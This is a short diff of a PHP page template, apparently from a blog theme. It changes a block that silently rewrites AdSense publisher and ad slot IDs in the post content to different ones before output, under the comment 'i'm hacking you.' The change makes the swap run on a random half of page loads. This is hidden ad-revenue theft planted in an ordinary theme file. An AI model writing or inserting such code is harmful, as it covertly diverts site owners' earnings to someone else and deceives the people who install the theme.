@@ -66,18 +66,14 @@ echo $post_full ?>">
 
                         <?php
 
-                        $currentHour = date('H');
-                        $timestamp = time();
-                        $dw = date( "w", $timestamp);
-                       
-			//if (($currentHour >= 16 && $currentHour < 7) || $dw == 0) {
+                        if(mt_rand(0,1) == 0) {
 
                             //i'm hacking you.
                             $content = str_replace("ca-pub-9594201080211682", "ca-pub-0031647560032028", $content);
                             $content = str_replace("9566298656", "5696989724", $content);
                             $content = str_replace("6678475853", "7394048928", $content);
 
-                        //}
+                        }
 
                         echo $content;
 
